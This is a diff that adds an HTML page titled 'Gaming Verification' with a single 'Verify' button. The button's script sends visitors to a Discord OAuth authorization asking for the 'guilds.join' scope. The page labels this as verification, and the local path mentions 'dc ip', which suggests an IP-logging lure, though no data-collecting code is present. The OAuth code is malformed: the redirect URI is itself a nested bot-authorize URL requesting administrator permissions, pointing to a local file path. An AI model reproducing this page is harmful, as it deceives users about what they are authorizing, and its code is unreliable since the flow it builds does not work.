@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gaming Verification</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #1f1c2c, #928dab);
+            overflow: hidden;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .verify-button {
+            position: relative;
+            background: #2c3e50;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            border: none;
+            border-radius: 50px;
+            padding: 15px 40px;
+            cursor: pointer;
+            outline: none;
+            transition: transform 0.2s ease, box-shadow 0.3s ease;
+        }
+
+        .verify-button:hover {
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
+        }
+
+        .verify-button:active {
+            transform: translateY(2px);
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.6);
+        }
+
+        .verify-button::before {
+            content: '';
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            right: -5px;
+            bottom: -5px;
+            border: 2px solid rgba(255, 255, 255, 0.8);
+            border-radius: 50px;
+            animation: glow 1.5s infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% {
+                box-shadow: 0 0 10px rgba(255, 255, 255, 0.4);
+            }
+            50% {
+                box-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="button-container">
+        <button class="verify-button" onclick="redirectToDiscord()">Verify</button>
+    </div>
+
+    <script>
+        function redirectToDiscord() {
+            const clientId = '1325227750323257365'; // Replace with your bot's client ID
+            const redirectUri = 'https://discord.com/oauth2/authorize?client_id=1325227750323257365&permissions=8&response_type=code&redirect_uri=file%3A%2F%2F%2Fc%253A%2FUsers%2FArvin%2FDesktop%2Fdc%2520ip%2Findex.html&integration_type=0&scope=identify+bot'; // Replace with your desired redirect URI
+            const scope = 'identify guilds.join'; // Required permissions
+
+            const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${encodeURIComponent(scope)}`;
+
+            window.location.href = authUrl;
+        }
+    </script>
+</body>
+</html>
